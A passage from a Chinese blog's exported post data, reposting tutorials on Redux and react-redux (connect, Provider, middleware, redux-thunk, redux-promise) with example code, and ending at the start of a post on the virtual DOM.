= connect()(TodoList); 但是，因为没有定义业务逻辑，上面这个容器组件毫无意义，只是 UI 组件的一个单纯的包装层。为了定义业务逻辑，需要给出下面两方面的信息： 1）输入逻辑：外部的数据（即state对象）如何转换为 UI 组件的参数 2）输出逻辑：用户发出的动作如何变为 Action 对象，从 UI 组件传出去。 因此，connect方法的完整 API 如下： 123456import &#123; connect &#125; from 'react-redux'const VisibleTodoList = connect( mapStateToProps, mapDispatchToProps)(TodoList) 上面代码中，connect 方法接受两个参数：mapStateToProps 和 mapDispatchToProps，它们定义了 UI 组件的业务逻辑，前者负责输入逻辑，即将 state 映射到 UI 组件的参数（props），后者负责输出逻辑，即将用户对 UI 组件的操作映射成 Action。 四、mapStateToProps() mapStateToProps 是一个函数，它的作用就是像它的名字那样，建立一个从（外部的）state 对象到（UI 组件的）props 对象的映射关系。作为函数，mapStateToProps 执行后应该返回一个对象，里面的每一个键值对就是一个映射。 下面代码中，mapStateToProps是一个函数，它接受state作为参数，返回一个对象。这个对象有一个todos属性，代表 UI 组件的同名参数，后面的getVisibleTodos也是一个函数，可以从state算出 todos 的值： 12345const mapStateToProps = (state) =&gt; &#123; return &#123; todos: getVisibleTodos(state.todos, state.visibilityFilter) &#125;&#125; 下面就是getVisibleTodos的一个例子，用来算出todos： 123456789101112const getVisibleTodos = (todos, filter) =&gt; &#123; switch (filter) &#123; case 'SHOW_ALL': return todos case 'SHOW_COMPLETED': return todos.filter(t =&gt; t.completed) case 'SHOW_ACTIVE': return todos.filter(t =&gt; !t.completed) default: throw new Error('Unknown filter: ' + filter) &#125;&#125; mapStateToProps 会订阅 Store，每当 state 更新的时候，就会自动执行，重新计算 UI 组件的参数，从而触发 UI 组件的重新渲染。 mapStateToProps 的第一个参数总是 state 对象，还可以使用第二个参数 ownProps，代表容器组件的 props 对象，使用 ownProps 作为参数后，如果容器组件的参数发生变化，也会引发 UI 组件重新渲染: 12345678910// 容器组件的代码// &lt;FilterLink filter=\"SHOW_ALL\"&gt;// All// &lt;/FilterLink&gt;const mapStateToProps = (state, ownProps) =&gt; &#123; return &#123; active: ownProps.filter === state.visibilityFilter &#125;&#125; connect 方法可以省略 mapStateToProps 参数，那样的话，UI 组件就不会订阅 Store，就是说 Store 的更新不会引起 UI 组件的更新。 五、mapDispatchToProps() mapDispatchToProps 是 connect 函数的第二个参数，用来建立 UI 组件的参数到 store.dispatch 方法的映射。也就是说，它定义了哪些用户的操作应该当作 Action，传给 Store。它可以是一个函数，也可以是一个对象。 如果 mapDispatchToProps 是一个函数，会得到 dispatch 和 ownProps（容器组件的props对象）两个参数，并返回一个对象，该对象的每个键值对都是一个映射，定义了 UI 组件的参数怎样发出 Action： 12345678910111213const mapDispatchToProps = ( dispatch, ownProps) =&gt; &#123; return &#123; onClick: () =&gt; &#123; dispatch(&#123; type: 'SET_VISIBILITY_FILTER', filter: ownProps.filter &#125;); &#125; &#125;;&#125; 如果 mapDispatchToProps 是一个对象，它的每个键名也是对应 UI 组件的同名参数，键值应该是一个函数，会被当作 Action creator ，返回的 Action 会由 Redux 自动发出。举例来说，上面的 mapDispatchToProps 写成对象就是下面这样： 123456onst mapDispatchToProps = &#123; onClick: (filter) =&gt; &#123; type: 'SET_VISIBILITY_FILTER', filter: filter &#125;;&#125; 六、Provider 组件 connect 方法生成容器组件以后，需要让容器组件拿到 state 对象，才能生成 UI 组件的参数。一种解决方法是将 state 对象作为参数，传入容器组件，但是这样做比较麻烦，尤其是容器组件可能在很深的层级，一级级将 state 传下去就很麻烦。 React-Redux 提供Provider组件，可以让容器组件拿到state： 12345678910111213import &#123; Provider &#125; from 'react-redux'import &#123; createStore &#125; from 'redux'import todoApp from './reducers'import App from './components/App'let store = createStore(todoApp);render( &lt;Provider store=&#123;store&#125;&gt; &lt;App /&gt; &lt;/Provider&gt;, document.getElementById('root')) 上面代码中，Provider 在根组件外面包了一层，这样一来，App 的所有子组件就默认都可以拿到 state 了。它的原理是 React 组件的 context 属性，请看源码: 1234567891011121314class Provider extends Component &#123; getChildContext() &#123; return &#123; store: this.props.store &#125;; &#125; render() &#123; return this.props.children; &#125;&#125;Provider.childContextTypes = &#123; store: React.PropTypes.object&#125; 上面代码中，store 放在了上下文对象 context 上面，然后，子组件就可以从 context 拿到 store ，代码大致如下： 12345678910111213141516171819class VisibleTodoList extends Component &#123; componentDidMount() &#123; const &#123; store &#125; = this.context; this.unsubscribe = store.subscribe(() =&gt; this.forceUpdate() ); &#125; render() &#123; const props = this.props; const &#123; store &#125; = this.context; const state = store.getState(); // ... &#125;&#125;VisibleTodoList.contextTypes = &#123; store: React.PropTypes.object&#125; React-Redux自动生成的容器组件的代码，就类似上面这样，从而拿到store。 七、实例：计数器 我们来看一个实例，下面是一个计数器组件，它是一个纯的 UI 组件，有两个参数 value 和 onIncreaseClick。前者需要从 state 计算得到，后者需要向外发出 Action： 1234567891011class Counter extends Component &#123; render() &#123; const &#123; value, onIncreaseClick &#125; = this.props return ( &lt;div&gt; &lt;span&gt;&#123;value&#125;&lt;/span&gt; &lt;button onClick=&#123;onIncreaseClick&#125;&gt;Increase&lt;/button&gt; &lt;/div&gt; ) &#125;&#125; 接着，定义 value 到 state 的映射，以及 onIncreaseClick 到 dispatch 的映射： 1234567891011121314function mapStateToProps(state) &#123; return &#123; value: state.count &#125;&#125;function mapDispatchToProps(dispatch) &#123; return &#123; onIncreaseClick: () =&gt; dispatch(increaseAction) &#125;&#125;// Action Creatorconst increaseAction = &#123; type: 'increase' &#125; 然后，使用connect方法生成容器组件：、 1234const App = connect( mapStateToProps, mapDispatchToProps)(Counter) 然后，定义这个组件的 Reducer： 12345678910// Reducerfunction counter(state = &#123; count: 0 &#125;, action) &#123; const count = state.count switch (action.type) &#123; case 'increase': return &#123; count: count + 1 &#125; default: return state &#125;&#125; 最后，生成store对象，并使用Provider在根组件外面包一层: 1234567891011121314151617181920import &#123; loadState, saveState &#125; from './localStorage';const persistedState = loadState();const store = createStore( todoApp, persistedState);store.subscribe(throttle(() =&gt; &#123; saveState(&#123; todos: store.getState().todos, &#125;)&#125;, 1000))ReactDOM.render( &lt;Provider store=&#123;store&#125;&gt; &lt;App /&gt; &lt;/Provider&gt;, document.getElementById('root')); 完整的代码看 这里 。 八、React-Router 路由库 使用 React-Router 的项目，与其他项目没有不同之处，也是使用 Provider 在 Router 外面包一层，毕竟 Provider 的唯一功能就是传入 store 对象： 1234567const Root = (&#123; store &#125;) =&gt; ( &lt;Provider store=&#123;store&#125;&gt; &lt;Router&gt; &lt;Route path=\"/\" component=&#123;App&#125; /&gt; &lt;/Router&gt; &lt;/Provider&gt;); 标注： http://www.ruanyifeng.com/blog/2016/09/redux_tutorial_part_three_react-redux.html","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"Redux入门之02-中间件与异步操作","slug":"Redux-ryf-02","date":"2018-12-13T17:31:55.000Z","updated":"2018-12-13T17:37:57.914Z","comments":true,"path":"2018/12/14/Redux-ryf-02/","link":"","permalink":"http://liuxuewen-site.github.io/2018/12/14/Redux-ryf-02/","excerpt":"","text":"一、前言 上一篇文章介绍了 Redux 的基本做法：用户发出 Action，Reducer 函数算出新的 State，View 重新渲染。 但是一个关键问题没有解决，异步操作怎么办？Action 发出以后，Reducer 立即算出 State，这叫做同步；Action 发出以后，过一段时间再执行 Reducer，这就是异步。 怎么才能 Reducer 在异步操作结束后自动执行呢？这就要用到新的工具：中间件（middleware）。 二、中间件的概念 为了理解中间件，让我们站在框架作者的角度思考问题：如果要添加功能，你会在哪个环节添加？ 1）Reducer：纯函数，只承担计算 State 的功能，不合适承担其他功能，也承担不了，因为理论上，纯函数不能进行读写操作。 2）View：与 State 一一对应，可以看作 State 的视觉层，也不合适承担其他功能。 3）Action：存放数据的对象，即消息的载体，只能被别人操作，自己不能进行任何操作。 想来想去，只有发送 Action 的这个步骤，即 store.dispatch() 方法，可以添加功能。举例来说，要添加日志功能，把 Action 和 State 打印出来，可以对 store.dispatch 进行如下改造： 123456let next = store.dispatch;store.dispatch = function dispatchAndLog(action) &#123; console.log('dispatching', action); next(action); console.log('next state', store.getState());&#125; 上面代码中，对 store.dispatch 进行了重定义，在发送 Action 前后添加了打印功能。这就是中间件的雏形。 中间件就是一个函数，对 store.dispatch 方法进行了改造，在发出 Action 和执行 Reducer 这两步之间，添加了其他功能。 三、中间件的用法 本教程不涉及如何编写中间件，因为常用的中间件都有现成的，只要引用别人写好的模块即可。比如上面的日志中间件，就有现成的 redux-logger 模块。这里只介绍怎么使用中间件： 12345678import &#123; applyMiddleware, createStore &#125; from 'redux';import createLogger from 'redux-logger';const logger = createLogger();const store = createStore( reducer, applyMiddleware(logger)); 上面代码中，redux-logger 提供一个生成器 createLogger ，可以生成日志中间件 logger。然后，将它放在 applyMiddleware 方法之中，传入 createStore 方法，就完成了 store.dispatch() 的功能增强。这里有两点需要注意： 1）createStore 方法可以接受整个应用的初始状态作为参数，那样的话，applyMiddleware 就是第三个参数了： 12345const store = createStore( reducer, initial_state, applyMiddleware(logger)); 2）中间件的次序有讲究： 1234567const store = createStore( reducer, applyMiddleware(thunk, promise, logger));// 上面代码中，applyMiddleware方法的三个参数，就是三个中间件。// 有的中间件有次序要求，使用前要查一下文档。比如，logger就一定要放在最后，否则输出结果会不正确。 看到这里你可能会问，applyMiddlewares 这个方法到底是干什么的？它是 Redux 的原生方法，作用是将所有中间件组成一个数组，依次执行。下面是它的源码： 12345678910111213141516export default function applyMiddleware(...middlewares) &#123; return (createStore) =&gt; (reducer, preloadedState, enhancer) =&gt; &#123; var store = createStore(reducer, preloadedState, enhancer); var dispatch = store.dispatch; var chain = []; var middlewareAPI = &#123; getState: store.getState, dispatch: (action) =&gt; dispatch(action) &#125;; chain = middlewares.map(middleware =&gt; middleware(middlewareAPI)); dispatch = compose(...chain)(store.dispatch); return &#123;...store, dispatch&#125; &#125;&#125; 上面代码中，所有中间件被放进了一个数组chain，然后嵌套执行，最后执行store.dispatch。可以看到，中间件内部（middlewareAPI）可以拿到 getState 和 dispatch 这两个方法。 四、异步操作的基本思路 理解了中间件以后，就可以处理异步操作了。同步操作只要发出一种 Action 即可，异步操作的差别是它要发出三种 Action： 1）操作发起时的 Action 2）操作成功时的 Action 3）操作失败时的 Action 以向服务器取出数据为例，三种 Action 可以有两种不同的写法： 123456789// 写法一：名称相同，参数不同&#123; type: 'FETCH_POSTS' &#125;&#123; type: 'FETCH_POSTS', status: 'error', error: 'Oops' &#125;&#123; type: 'FETCH_POSTS', status: 'success', response: &#123; ... &#125; &#125;// 写法二：名称不同&#123; type: 'FETCH_POSTS_REQUEST' &#125;&#123; type: 'FETCH_POSTS_FAILURE', error: 'Oops' &#125;&#123; type: 'FETCH_POSTS_SUCCESS', response: &#123; ... &#125; &#125; 除了 Action 种类不同，异步操作的 State 也要进行改造，反映不同的操作状态。下面是 State 的一个例子: 123456let state = &#123; // ... isFetching: true, didInvalidate: true, lastUpdated: 'xxxxxxx'&#125;; 上面代码中，State 的属性 isFetching 表示是否在抓取数据，didInvalidate 表示数据是否过时，lastUpdated 表示上一次更新时间。 现在，整个异步操作的思路就很清楚了： 1）操作开始时，送出一个 Action，触发 State 更新为”正在操作”状态，View 重新渲染 2）操作结束后，再送出一个 Action，触发 State 更新为”操作结束”状态，View 再一次重新渲染 五、redux-thunk 中间件 异步操作至少要送出两个 Action：用户触发第一个 Action，这个跟同步操作一样，没有问题；如何才能在操作结束时，系统自动送出第二个 Action 呢？奥妙就在 Action Creator 之中： 12345678class AsyncApp extends Component &#123; componentDidMount() &#123; const &#123; dispatch, selectedPost &#125; = this.props dispatch(fetchPosts(selectedPost)) &#125; // ...&#125; 上面代码是一个异步组件的例子。加载成功后（componentDidMount方法），它送出了（dispatch方法）一个 Action，向服务器要求数据 fetchPosts(selectedSubreddit)。这里的fetchPosts就是 Action Creator。 下面就是 fetchPosts 的代码，关键之处就在里面: 1234567891011121314const fetchPosts = postTitle =&gt; (dispatch, getState) =&gt; &#123; dispatch(requestPosts(postTitle)); return fetch(`/some/API/$&#123;postTitle&#125;.json`) .then(response =&gt; response.json()) .then(json =&gt; dispatch(receivePosts(postTitle, json)));&#125;;// 使用方法一store.dispatch(fetchPosts('reactjs'));// 使用方法二store.dispatch(fetchPosts('reactjs')).then(() =&gt; console.log(store.getState())); 上面代码中，fetchPosts 是一个Action Creator（动作生成器），返回一个函数。这个函数执行后，先发出一个Action（requestPosts(postTitle)），然后进行异步操作。拿到结果后，先将结果转成 JSON 格式，然后再发出一个 Action（ receivePosts(postTitle, json)）。 上面代码中，有几个地方需要注意: 1）fetchPosts返回了一个函数，而普通的 Action Creator 默认返回一个对象。 2）返回的函数的参数是 dispatch 和 getState 这两个 Redux 方法，普通的 Action Creator 的参数是 Action 的内容。 3）在返回的函数之中，先发出一个 Action（requestPosts(postTitle)），表示操作开始。 4）异步操作结束之后，再发出一个 Action（receivePosts(postTitle, json)），表示操作结束。 这样的处理，就解决了自动发送第二个 Action 的问题。但是，又带来了一个新的问题，Action 是由 store.dispatch 方法发送的。而 store.dispatch 方法正常情况下，参数只能是对象，不能是函数。 这时，就要使用中间件redux-thunk，下面代码使用redux-thunk中间件，改造store.dispatch，使得后者可以接受函数作为参数: 123456789import &#123; createStore, applyMiddleware &#125; from 'redux';import thunk from 'redux-thunk';import reducer from './reducers';// Note: this API requires redux@&gt;=3.1.0const store = createStore( reducer, applyMiddleware(thunk)); 因此，异步操作的第一种解决方案就是，写出一个返回函数的 Action Creator，然后使用 redux-thunk 中间件改造store.dispatch。 六、redux-promise 中间件 既然 Action Creator 可以返回函数，当然也可以返回其他值。另一种异步操作的解决方案，就是让 Action Creator 返回一个 Promise 对象。这就需要使用 redux-promise 中间件： 12345678import &#123; createStore, applyMiddleware &#125; from 'redux';import promiseMiddleware from 'redux-promise';import reducer from './reducers';const store = createStore( reducer, applyMiddleware(promiseMiddleware)); 这个中间件使得 store.dispatch 方法可以接受 Promise 对象作为参数。这时，Action Creator 有两种写法，写法一，返回值是一个 Promise 对象： 123456789const fetchPosts = (dispatch, postTitle) =&gt; new Promise(function (resolve, reject) &#123; dispatch(requestPosts(postTitle)); return fetch(`/some/API/$&#123;postTitle&#125;.json`) .then(response =&gt; &#123; type: 'FETCH_POSTS', payload: response.json() &#125;); &#125;); 写法二，Action 对象的 payload 属性是一个 Promise 对象，这需要从 redux-actions 模块引入 createAction 方法，并且写法也要变成下面这样： 1234567891011121314151617import &#123; createAction &#125; from 'redux-actions';class AsyncApp extends Component &#123; componentDidMount() &#123; const &#123; dispatch, selectedPost &#125; = this.props // 发出同步 Action dispatch(requestPosts(selectedPost)); // 发出异步 Action dispatch(createAction( 'FETCH_POSTS', fetch(`/some/API/$&#123;postTitle&#125;.json`) .then(response =&gt; response.json()) ) );&#125; 上面代码中，第二个 dispatch 方法发出的是异步 Action，只有等到操作结束，这个 Action 才会实际发出。注意，createAction 的第二个参数必须是一个 Promise 对象。 看一下redux-promise的源码，就会明白它内部是怎么操作的： 12345678910111213141516171819export default function promiseMiddleware(&#123; dispatch &#125;) &#123; return next =&gt; action =&gt; &#123; if (!isFSA(action)) &#123; return isPromise(action) ? action.then(dispatch) : next(action); &#125; return isPromise(action.payload) ? action.payload.then( result =&gt; dispatch(&#123; ...action, payload: result &#125;), error =&gt; &#123; dispatch(&#123; ...action, payload: error, error: true &#125;); return Promise.reject(error); &#125; ) : next(action); &#125;;&#125; 从上面代码可以看出，如果 Action 本身是一个 Promise，它 resolve 以后的值应该是一个 Action 对象，会被 dispatch 方法送出（action.then(dispatch)），但 reject 以后不会有任何动作；如果 Action 对象的 payload 属性是一个 Promise 对象，那么无论 resolve 和 reject，dispatch方法都会发出 Action。 标注： 参考资料1：http://www.ruanyifeng.com/blog/2016/09/redux_tutorial_part_two_async_operations.html","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"Redux入门之01-基本用法","slug":"Redux-ryf-01","date":"2018-12-12T17:36:57.000Z","updated":"2019-01-25T10:19:42.016Z","comments":true,"path":"2018/12/13/Redux-ryf-01/","link":"","permalink":"http://liuxuewen-site.github.io/2018/12/13/Redux-ryf-01/","excerpt":"","text":"一、前言 React 只是 DOM 的一个抽象层，并不是 Web 应用的完整解决方案，它有两个没有涉及：代码结构与组件之间的通信。对于大型的复杂应用来说，这两方面恰恰是最关键的。因此，只用 React 没法写大型应用。 为了解决这个问题，2014年 Facebook 提出了 Flux 架构的概念，引发了很多的实现。2015年，Redux 出现，将 Flux 与函数式编程结合一起，很短时间内就成为了最热门的前端架构。 二、你可能不需要 Redux 首先明确一点，Redux 是一个有用的架构，但不是非用不可。事实上大多数情况你可以不用它，只用 React 就够了。如果你不知道是否需要 Redux，那就是不需要它，只有遇到 React 实在解决不了的问题，你才需要 Redux 。 下面这些情况，都不需要使用 Redux，用了反而增加复杂性： 1）用户的使用方式非常简单 2）用户之间没有协作 3）不需要与服务器大量交互，也没有使用 WebSocket 4）视图层（View）只从单一来源获取数据 下面这些情况才是 Redux 的适用场景，多交互、多数据源： 1）用户的使用方式复杂 2）多个用户之间可以协作 3）与服务器大量交互，或者使用了WebSocket 4）View要从多个来源获取数据 5）不同身份的用户有不同的使用方式（比如普通用户和管理员） 从组件角度看，如果你的应用有以下场景，可以考虑使用 Redux： 1）某个组件的状态，需要共享 2）某个状态需要在任何地方都可以拿到 3）一个组件需要改变全局状态 4）一个组件需要改变另一个组件的状态 发生上面情况时，如果不使用 Redux 或者其他状态管理工具，不按照一定规律处理状态的读写，代码很快就会变成一团乱麻。你需要一种机制，可以在同一个地方查询状态、改变状态、传播状态的变化。 总之，不要把 Redux 当作万灵丹，如果你的应用没那么复杂，就没必要用它。另一方面，Redux 只是 Web 架构的一种解决方案，也可以选择其他方案。 三、设计思想 （1）Web 应用是一个状态机，视图与状态是一一对应的。 （2）所有的状态，保存在一个对象里面。 四、基本概念和 API 1、Store Store 就是保存数据的地方，你可以把它看成一个容器。整个应用只能有一个 Store。 Redux 提供 createStore 这个函数，用来生成 Store，该函数接受另一个函数作为参数，返回新生成的 Store 对象： 123import &#123; createStore &#125; from 'redux';const store = createStore(fn); 2、State Store 对象包含所有数据，如果想得到某个时点的数据，就要对 Store 生成快照，这种时点的数据集合，就叫做 State。 当前时刻的 State，可以通过 store.getState() 拿到： 1234import &#123; createStore &#125; from 'redux';const store = createStore(fn);const state = store.getState(); Redux 规定，一个 State 对应一个 View，只要 State 相同，View 就相同，你知道 State，就知道 View 是什么样，反之亦然。 3、Action State 的变化，会导致 View 的变化，但是用户接触不到 State，只能接触到 View，所以，State 的变化必须是 View 导致的，Action 就是 View 发出的通知，表示 State 应该要发生变化了。 Action 是一个对象，其中的type属性是必须的，表示 Action 的名称。其他属性可以自由设置，社区有一个 规范 可以参考。下面代码中，Action 的名称是 ADD_TODO，它携带的信息是字符串 Learn Redux: 1234const action = &#123; type: 'ADD_TODO', payload: 'Learn Redux'&#125;; 可以这样理解，Action 描述当前发生的事情，改变 State 的唯一办法，就是使用 Action，它会运送数据到 Store。 4、Action Creator View 要发送多少种消息，就会有多少种 Action，如果都手写，会很麻烦。可以定义一个函数来生成 Action，这个函数就叫 Action Creator，下面代码中，addTodo 函数就是一个 Action Creator： 12345678910const ADD_TODO = '添加 TODO';function addTodo(text) &#123; return &#123; type: ADD_TODO, text &#125;&#125;const action = addTodo('Learn Redux'); 5、store.dispatch() store.dispatch() 是 View 发出 Action 的唯一方法。下面代码中，store.dispatch 接受一个 Action 对象作为参数，将它发送出去： 1234567import &#123; createStore &#125; from 'redux';const store = createStore(fn);store.dispatch(&#123; type: 'ADD_TODO', payload: 'Learn Redux'&#125;); 结合 Action Creator，这段代码可以改写如下: 1store.dispatch(addTodo('Learn Redux')); 6、Reducer Store 收到 Action 以后，必须给出一个新的 State，这样 View 才会发生变化，这种 State 的计算过程就叫做 Reducer。 Reducer 是一个函数，它接受 Action 和当前 State 作为参数，返回一个新的 State： 1234const reducer = function (state, action) &#123; // ... return new_state;&#125;; 整个应用的初始状态，可以作为 State 的默认值。下面是一个实际的例子: 123456789101112const defaultState = 0;const reducer = (state = defaultState, action) =&gt; &#123; switch (action.type) &#123; case 'ADD': return state + action.payload; default: return state; &#125;&#125;;const state = reducer(1, &#123; type: 'ADD', payload: 2&#125;); 上面代码中，reducer 函数收到名为 ADD 的 Action 以后，就返回一个新的 State，作为加法的计算结果。其他运算的逻辑（比如减法），也可以根据 Action 的不同来实现。 实际应用中，Reducer 函数不用像上面这样手动调用，store.dispatch 方法会触发 Reducer 的自动执行。为此，Store 需要知道 Reducer 函数，做法就是在生成 Store 的时候，将 Reducer 传入createStore方法: 12import &#123; createStore &#125; from 'redux';const store = createStore(reducer); 上面代码中，createStore 接受 Reducer 作为参数，生成一个新的 Store。以后每当 store.dispatch 发送过来一个新的 Action，就会自动调用 Reducer，得到新的 State。 为什么这个函数叫做 Reducer 呢？因为它可以作为数组的 reduce 方法的参数。请看下面的例子，一系列 Action 对象按照顺序作为一个数组: 1234567const actions = [ &#123; type: 'ADD', payload: 0 &#125;, &#123; type: 'ADD', payload: 1 &#125;, &#123; type: 'ADD', payload: 2 &#125;];const total = actions.reduce(reducer, 0); // 3 上面代码中，数组 actions 表示依次有三个 Action，分别是加0、加1和加2。数组的 reduce 方法接受 Reducer 函数作为参数，就可以直接得到最终的状态3。 7、纯函数 Reducer 函数最重要的特征是，它是一个纯函数，也就是说，只要是同样的输入必定得到同样的输出。 纯函数是函数式编程的概念，必须遵守以下一些约束： 1）不得改写参数 2）不能调用系统 I/O 的API 3）不能调用Date.now()或者Math.random()等不纯的方法，因为每次会得到不一样的结果 由于 Reducer 是纯函数，就可以保证同样的 State，必定得到同样的 View，但也正因为这一点，Reducer 函数里面不能改变 State，必须返回一个全新的对象，请参考下面的写法： 1234567891011// State 是一个对象function reducer(state, action) &#123; return Object.assign(&#123;&#125;, state, &#123; thingToChange &#125;); // 或者 return &#123; ...state, ...newState &#125;;&#125;// State 是一个数组function reducer(state, action) &#123; return [...state, newItem];&#125; 最好把 State 对象设成只读，你没法改变它，要得到新的 State，唯一办法就是生成一个新对象。这样的好处是，任何时候，与某个 View 对应的 State 总是一个不变的对象。 8、store.subscribe() Store 允许使用 store.subscribe 方法设置监听函数，一旦 State 发生变化，就自动执行这个函数： 1234import &#123; createStore &#125; from 'redux';const store = createStore(reducer);store.subscribe(listener); 显然，只要把 View 的更新函数（对于 React 项目，就是组件的 render 方法或 setState 方法）放入 listen，就会实现 View 的自动渲染。 store.subscribe 方法返回一个函数，调用这个函数就可以解除监听: 12345let unsubscribe = store.subscribe(() =&gt; console.log(store.getState()));unsubscribe(); 五、Store 的实现 上面介绍了 Redux 涉及的基本概念，可以发现 Store 提供了三个方法： 123456// 1）store.getState()// 2）store.dispatch()// 3）store.subscribe()import &#123; createStore &#125; from 'redux';let &#123; subscribe, dispatch, getState &#125; = createStore(reducer); createStore 方法还可以接受第二个参数，表示 State 的最初状态，这通常是服务器给出的，下面代码中，window.STATE_FROM_SERVER 就是整个应用的状态初始值。注意，如果提供了这个参数，它会覆盖 Reducer 函数的默认初始值： 1let store = createStore(todoApp, window.STATE_FROM_SERVER) 下面是 createStore 方法的一个简单实现，可以了解一下 Store 是怎么生成的： 12345678910111213141516171819202122const createStore = (reducer) =&gt; &#123; let state; let listeners = []; const getState = () =&gt; state; const dispatch = (action) =&gt; &#123; state = reducer(state, action); listeners.forEach(listener =&gt; listener()); &#125;; const subscribe = (listener) =&gt; &#123; listeners.push(listener); return () =&gt; &#123; listeners = listeners.filter(l =&gt; l !== listener); &#125; &#125;; dispatch(&#123;&#125;); return &#123; getState, dispatch, subscribe &#125;;&#125;; 六、Reducer 的拆分 Reducer 函数负责生成 State。由于整个应用只有一个 State 对象，包含所有数据，对于大型应用来说，这个 State 必然十分庞大，导致 Reducer 函数也十分庞大。请看下面的例子： 123456789101112131415161718const chatReducer = (state = defaultState, action = &#123;&#125;) =&gt; &#123; const &#123; type, payload &#125; = action; switch (type) &#123; case ADD_CHAT: return Object.assign(&#123;&#125;, state, &#123; chatLog: state.chatLog.concat(payload) &#125;); case CHANGE_STATUS: return Object.assign(&#123;&#125;, state, &#123; statusMessage: payload &#125;); case CHANGE_USERNAME: return Object.assign(&#123;&#125;, state, &#123; userName: payload &#125;); default: return state; &#125;&#125;; 上面代码中，三种 Action 分别改变 State 的三个属性： 123ADD_CHAT：chatLog属性CHANGE_STATUS：statusMessage属性CHANGE_USERNAME：userName属性 这三个属性之间没有联系，这提示我们可以把 Reducer 函数拆分。不同的函数负责处理不同属性，最终把它们合并成一个大的 Reducer 即可。下面代码中，Reducer 函数被拆成了三个小函数，每一个负责生成对应的属性: 1234567const chatReducer = (state = defaultState, action = &#123;&#125;) =&gt; &#123; return &#123; chatLog: chatLog(state.chatLog, action), statusMessage: statusMessage(state.statusMessage, action), userName: userName(state.userName, action) &#125;&#125;; 这样一拆，Reducer 就易读易写多了。而且，这种拆分与 React 应用的结构相吻合：一个 React 根组件由很多子组件构成，这就是说，子组件与子 Reducer 完全可以对应。 Redux 提供了一个combineReducers方法，用于 Reducer 的拆分，你只要定义各个子 Reducer 函数，然后用这个方法，将它们合成一个大的 Reducer。下面的代码通过 combineReducers 方法将三个子 Reducer 合并成一个大的函数： 123456789import &#123; combineReducers &#125; from 'redux';const chatReducer = combineReducers(&#123; chatLog, statusMessage, userName&#125;)export default todoApp; 这种写法有一个前提，就是 State 的属性名必须与子 Reducer 同名，如果不同名，就要采用下面的写法： 1234567891011121314const reducer = combineReducers(&#123; a: doSomethingWithA, b: processB, c: c&#125;)// 等同于function reducer(state = &#123;&#125;, action) &#123; return &#123; a: doSomethingWithA(state.a, action), b: processB(state.b, action), c: c(state.c, action) &#125;&#125; 总之，combineReducers() 做的就是产生一个整体的 Reducer 函数，该函数根据 State 的 key 去执行相应的子 Reducer，并将返回结果合并成一个大的 State 对象。 下面是 combineReducer 的简单实现： 1234567891011const combineReducers = reducers =&gt; &#123; return (state = &#123;&#125;, action) =&gt; &#123; return Object.keys(reducers).reduce( (nextState, key) =&gt; &#123; nextState[key] = reducers[key](state[key], action); return nextState; &#125;, &#123;&#125; ); &#125;;&#125;; 你可以把所有子 Reducer 放在一个文件里面，然后统一引入: 1234import &#123; combineReducers &#125; from 'redux'import * as reducers from './reducers'const reducer = combineReducers(reducers) 七、工作流程 如图： 首先，用户发出 Action： 1store.dispatch(action); 然后，Store 自动调用 Reducer，并且传入两个参数：当前 State 和收到的 Action。Reducer 会返回新的 State : 1let nextState = todoApp(previousState, action); State 一旦有变化，Store 就会调用监听函数: 1store.subscribe(listener); // 设置监听函数 listener 可以通过 store.getState() 得到当前状态，如果使用的是 React，这时可以触发重新渲染 View： 1234function listerner() &#123; let newState = store.getState(); component.setState(newState); &#125; 八、实例：计数器 下面我们来看一个最简单的实例： 12345678910111213const Counter = (&#123; value &#125;) =&gt; ( &lt;h1&gt;&#123;value&#125;&lt;/h1&gt;);const render = () =&gt; &#123; ReactDOM.render( &lt;Counter value=&#123;store.getState()&#125;/&gt;, document.getElementById('root') );&#125;;store.subscribe(render);render(); 上面是一个简单的计数器，唯一的作用就是把参数 value 的值，显示在网页上。Store 的监听函数设置为 render，每次 State 的变化都会导致网页重新渲染。 下面加入一点变化，为Counter添加递增和递减的 Action： 12345678910111213141516171819202122232425262728293031const Counter = (&#123; value, onIncrement, onDecrement &#125;) =&gt; ( &lt;div&gt; &lt;h1&gt;&#123;value&#125;&lt;/h1&gt; &lt;button onClick=&#123;onIncrement&#125;&gt;+&lt;/button&gt; &lt;button onClick=&#123;onDecrement&#125;&gt;-&lt;/button&gt; &lt;/div&gt;);const reducer = (state = 0, action) =&gt; &#123; switch (action.type) &#123; case 'INCREMENT': return state + 1; case 'DECREMENT': return state - 1; default: return state; &#125;&#125;;const store = createStore(reducer);const render = () =&gt; &#123; ReactDOM.render( &lt;Counter value=&#123;store.getState()&#125; onIncrement=&#123;() =&gt; store.dispatch(&#123;type: 'INCREMENT'&#125;)&#125; onDecrement=&#123;() =&gt; store.dispatch(&#123;type: 'DECREMENT'&#125;)&#125; /&gt;, document.getElementById('root') );&#125;;render();store.subscribe(render); 完整的代码 看这 。 标注： 参考资料1：http://www.ruanyifeng.com/blog/2016/09/redux_tutorial_part_one_basic_usages.html","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"虚拟DOM","slug":"JS-bs-virtualDom","date":"2018-09-16T15:31:24.000Z","updated":"2019-01-25T10:12:36.844Z","comments":true,"path":"2018/09/16/JS-bs-virtualDom/","link":"","permalink":"http://liuxuewen-site.github.io/2018/09/16/JS-bs-virtualDom/","excerpt":"","text":"一、虚拟DOM出现 先介绍浏览器加载一个HTML文件需要做哪些事，帮助我们理解为什么需要虚拟DOM。webkit引擎的处理流程如下： 所有浏览器的引擎工作流程都差不多，如上图大致分5步：创建DOM tree –&gt; 创建Style Rules -&gt; 构建Render tree -&gt; 布局Layout –&gt; 绘制Painting 1）第一步，用HTML分析器，分析HTML元素，构建一颗DOM树。 2）第二步，用CSS分析器，分析CSS文件和元素上的inline样式，生成页面的样式表。 